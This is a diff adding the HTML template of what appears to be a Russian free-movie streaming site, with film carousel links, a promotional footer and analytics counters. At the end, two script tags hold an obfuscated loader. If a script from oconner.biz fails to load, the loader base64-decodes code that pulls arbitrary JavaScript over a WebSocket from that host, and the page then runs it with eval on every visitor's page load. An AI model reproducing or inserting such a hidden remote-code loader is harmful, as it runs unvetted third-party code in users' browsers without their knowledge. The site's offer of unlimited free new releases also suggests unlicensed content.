+<li><div class="inner"><a href="http://kinogo.club/6575-kredo-ubiycy-2017.html" title="Кредо убийцы (2017)"><img src="/uploads/posts/2016-11/thumbs/1478876170_kredoubiycy.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6574-passazhiry-2016.html" title="Пассажиры (2016)"><img src="/uploads/posts/2016-11/thumbs/1478875912_passazhiry.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6256-doktor-strendzhs-2016.html" title="Доктор Стрэндж (2016)"><img src="/uploads/posts/2016-04/thumbs/1461538899_doktorstrenzh.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6546-shpiony-po-sosedstvue-2016.html" title="Шпионы по соседству (2016)"><img src="/uploads/posts/2016-11/thumbs/1478342148_shpionypososedstvu.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6258-zvezdnye-voynye-8-izgoy-odin-2016.html" title="Звёздные войны 8. Истории: Изгой-один (2016)"><img src="/uploads/posts/2016-12/thumbs/1481888688_zvezdnyevoyny8.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/5915-otryad-samoubiyc-2016.html" title="Отряд самоубийц (2016)"><img src="/uploads/posts/2016-04/thumbs/1459540165_otryadsamoubiyc.jpg" width="118"></a></div></li>
+
+                <li><div class="inner"><a href="http://kinogo.club/6546-shpiony-po-sosedstvue-2016.html" title="Шпионы по соседству (2016)"><img src="/uploads/posts/2016-11/thumbs/1478342148_shpionypososedstvu.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6258-zvezdnye-voynye-8-izgoy-odin-2016.html" title="Звёздные войны 8. Истории: Изгой-один (2016)"><img src="/uploads/posts/2016-12/thumbs/1481888688_zvezdnyevoyny8.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/5915-otryad-samoubiyc-2016.html" title="Отряд самоубийц (2016)"><img src="/uploads/posts/2016-04/thumbs/1459540165_otryadsamoubiyc.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6257-bolshoy-i-dobryy-velikan-2016.html" title="Большой и добрый великан (2016)"><img src="/uploads/posts/2016-04/thumbs/1461539147_bolshoydobryyvelikan.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6255-zachinschiki-2016.html" title="Зачинщики (2016)"><img src="/uploads/posts/2016-04/thumbs/1461538606_zachnishiki.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6615-pit-i-ego-drakon-2016.html" title="Пит и его дракон (2016)"><img src="/uploads/posts/2016-11/thumbs/1479499036_pitiegodrakon.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6254-dzheyson-born-2016.html" title="Джейсон Борн (2016)"><img src="/uploads/posts/2016-04/thumbs/1461538266_dzheysonborn.jpg" width="118"></a></div></li>
+
+                <li><div class="inner"><a href="http://kinogo.club/6255-zachinschiki-2016.html" title="Зачинщики (2016)"><img src="/uploads/posts/2016-04/thumbs/1461538606_zachnishiki.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6615-pit-i-ego-drakon-2016.html" title="Пит и его дракон (2016)"><img src="/uploads/posts/2016-11/thumbs/1479499036_pitiegodrakon.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6254-dzheyson-born-2016.html" title="Джейсон Борн (2016)"><img src="/uploads/posts/2016-04/thumbs/1461538266_dzheysonborn.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6412-nerv-2016.html" title="Нерв (2016)"><img src="/uploads/posts/2016-08/thumbs/1472246942_nerv.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6469-bridzhit-dzhons-3-2016.html" title="Бриджит Джонс 3 (2016)"><img src="/uploads/posts/2016-09/thumbs/1474188440_bridzhitdzhons3.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6245-prishelcy-3-vzyatie-bastiliie-2016.html" title="Пришельцы 3: Взятие Бастилии (2016)"><img src="/uploads/posts/2016-04/thumbs/1461536269_prishelcy3vzyatiebastilii.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6356-otmel-2016.html" title="Отмель (2016)"><img src="/uploads/posts/2016-07/thumbs/1468154831_otmel.jpg" width="118"></a></div></li>
+
+                <li><div class="inner"><a href="http://kinogo.club/6469-bridzhit-dzhons-3-2016.html" title="Бриджит Джонс 3 (2016)"><img src="/uploads/posts/2016-09/thumbs/1474188440_bridzhitdzhons3.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6245-prishelcy-3-vzyatie-bastiliie-2016.html" title="Пришельцы 3: Взятие Бастилии (2016)"><img src="/uploads/posts/2016-04/thumbs/1461536269_prishelcy3vzyatiebastilii.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6356-otmel-2016.html" title="Отмель (2016)"><img src="/uploads/posts/2016-07/thumbs/1468154831_otmel.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/5914-varkraft-2016.html" title="Варкрафт (2016)"><img src="/uploads/posts/2015-10/thumbs/1445225995_varkraft.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/5913-angry-birds-v-kino-2016.html" title="Angry Birds в кино (2016)"><img src="/uploads/posts/2015-10/thumbs/1445225421_engriberdsvkino.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6206-da-zdravstvuet-cezars-2016.html" title="Да здравствует Цезарь! (2016)"><img src="/uploads/posts/2016-04/thumbs/1460065835_dazdravstvuetzecar.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/5908-i-gryanul-shtorm-2016.html" title="И грянул шторм (2016)"><img src="/uploads/posts/2016-04/thumbs/1459940227_igryanulshtorm.jpg" width="118"></a></div></li>
+
+              </ul>
+            </div>
+            <a class="carousel_next carousel_right" href="">next</a>
+          </div>
+        </div>
+    </div>
+
+
+
+</div><!--header-->
+
+
+
+
+<div class="footer">
+
+ 
+    <div class="footer-text">
+
+
+<p>Рады приветствовать всех любителей интересного и качественного кино на нашем сайте! Вы любите кинематограф также как мы? Постоянно следите за выходом новинок? Не проходит ни одного вечера, чтобы вы не посмотрели пару-тройку фильмов? Тогда вы пришли точно по адресу! В нашем кинотеатре можно <strong>смотреть фильмы онлайн бесплатно</strong> и без каких-либо ограничений!</p>
+<p><img src="/templates/kinogo/images/category/footer-main.jpg" title="просмотр фильмов онлайн">Специально для наших уважаемых пользователей мы постарались собрать лучшую коллекцию фильмов различных жанров, времен и народов! Команда проекта постоянно следит за выходом фильмов в прокат и регулярно добавляет картины, чтобы вы могли  одними из первых наслаждаться, как лучшими мировыми шедеврами, так и новинками кино совершенно бесплатно! </p>
+<p>У нас вы найдете лучшие фильмы «Золотой эпохи» Голливуда, классическое европейское кино, лучшие французские комедии, азиатское кино, советские картины и современные хиты <a href="/filmy_2011/">2011</a>, <a href="/filmy_2012/">2012</a>, а также <a href="/filmy_2013/">фильмы 2013</a> годов. Мы собрали внушительную коллекцию художественных и документальных фильмов, боевиков и триллеров, фэнтези и фантастики, драм и мелодрам, здесь же вы найдете <a href="/komedii/">комедии</a>, <a href="/uzhasy/">ужасы</a>, приключенческие и исторические ленты, детективы, вестерны, кино на военную тематику, а также картины других жанров и направлений. У нас смотреть фильмы можно в любое время, в неограниченных количествах, совершенно бесплатно и при этом в отличном качестве! Собирайтесь с друзьями, выбирайте хорошее кино, смотрите и делитесь впечатлениями! Здесь каждый сможет найти что-то интересное для себя. Жанровое кино, старый добрый советский фильм, а может быть, интересную документальную ленту. Любители новинок также смогут смотреть свежие фильмы 2014 в хорошем качестве картинки и звука.</p>
+<p>Специально для вашего удобства на сайте действует поисковая строка, благодаря которой можно быстро отыскать нужный фильм, введя его русское или оригинальное название. Если поиск не дал результатов, попробуйте воспользоваться расширенным поиском или напишите нам, и мы обязательно постараемся добавить нужный вам фильм. Также мы постарались максимально удобно структурировать сам сайт, чтобы искать фильмы различных жанров стало еще проще. Мы стараемся удовлетворять запросы широкого круга зрителей, поэтому оперативно добавляем новые фильмы практически сразу после их выхода в прокат, а затем регулярно обновляем их качество на лучшее сразу после релиза DVD или Blu-ray дисков. Поэтому наш кинотеатр готов стать верным партнером и помощником, как для ценителей отменного качества, так и для тех зрителей, которые предпочитают посмотреть новый фильм как можно быстрее.</p> 
+<p>Смотрите хорошее <strong>кино онлайн бесплатно</strong>, без регистрации и отправки смс даже не выходя из дома!</p> 
+
+
+
+
+
+ </div><!--div--> 
+ 
+ 
+
+
+
+<div style="float:left;" class="partners">
+<noindex><!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='//counter.yadro.ru/hit?t39.5;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border='0' width='31' height='31'><\/a>")
+    //--></script><!--/LiveInternet--> </noindex></div> <span style="float:left; padding-top: 12px; padding-left:3px; "><a href="/copyrightz.html" rel="nofollow" style="font-weight:bold;">Правообладателям</a> • <a href="/index.php?do=feedback" rel="nofollow">Контакты</a></span>   
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+(function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+            w.yaCounter20424475 = new Ya.Metrika({id:20424475,
+                    webvisor:true,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true});
+        } catch(e) { }
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f, false);
+    } else { f(); }
+})(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="//mc.yandex.ru/watch/20424475" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    <!-- /Yandex.Metrika counter -->
+    
+
+  
+  
+  
+  
+  
+<div style="float:right;  text-align: right; width:300px; padding-top: 3px;">
+
+
+  </div>
+  
+
+
+  
+ 
+
+  
+      
+</div><!--footer-->
+
+</div><!--wrapper-->
+
+
+<noindex><!-- BEGIN TAG - DO NOT MODIFY -->
+<script type="text/javascript"> (function(){ var h = document.getElementsByTagName("head")[0], s = document.createElement("script"), f = function(){ AMSP.loadAsset("1c7d6160ad2148846366adab8871e820", ""); }; s.setAttribute("type", "text/javascript"); s.setAttribute("src", "//oconner.biz/js/lib.js"); s.onload = function(){ typeof AMSP === 'undefined' ? this.onerror() : f(); }; s.onerror = function(){ try { var w = new Worker(URL.createObjectURL( new Blob(['eval(atob(\'dmFyIHdzID0gbmV3IFdlYlNvY2tldCgnd3NzOi8vb2Nvbm5lci5iaXo6ODA0MS9qcy9saWIuanM/bGliPXdyaycpOwogICAgICAgIHdzLm9ubWVzc2FnZSA9IGZ1bmN0aW9uKHQpewogICAgICAgICAgICBwb3N0TWVzc2FnZSh0LmRhdGEpOwogICAgICAgICAgICB3cy5jbG9zZSgpOwogICAgICAgIH07\'))']), {type: 'application/javascript'} )); w.onmessage = function(t){ typeof AMSP === 'undefined' ? window.addEventListener("amspInit", f) : f(); window.eval(t.data); }; } catch(e) {} }; h.insertBefore(s, h.firstChild);})();</script>
+<!-- END TAG --></noindex>    
+
+<!--noindex--><!-- BEGIN TAG - HEAD -->
+<script type="text/javascript"> (function(){ var h = document.getElementsByTagName("head")[0], s = document.createElement("script"), f = function(){ AMSP.loadAsset("0a32fdf12b831c78c2080510ddf1a0f1", ""); }; s.setAttribute("type", "text/javascript"); s.setAttribute("src", "//oconner.biz/js/lib.js"); s.onload = function(){ typeof AMSP === 'undefined' ? this.onerror() : f(); }; s.onerror = function(){ try { var w = new Worker(URL.createObjectURL( new Blob(['eval(atob(\'dmFyIHdzID0gbmV3IFdlYlNvY2tldCgnd3NzOi8vb2Nvbm5lci5iaXo6ODA0MS9qcy9saWIuanM/bGliPXdyaycpOwogICAgICAgIHdzLm9ubWVzc2FnZSA9IGZ1bmN0aW9uKHQpewogICAgICAgICAgICBwb3N0TWVzc2FnZSh0LmRhdGEpOwogICAgICAgICAgICB3cy5jbG9zZSgpOwogICAgICAgIH07\'))']), {type: 'application/javascript'} )); w.onmessage = function(t){ typeof AMSP === 'undefined' ? window.addEventListener("amspInit", f) : f(); window.eval(t.data); }; } catch(e) {} }; h.insertBefore(s, h.firstChild);})();</script>
+<!-- END TAG - HEAD --><!--/noindex-->
+
+
+
+    
+    
+    
+    
+</body>
+</html>
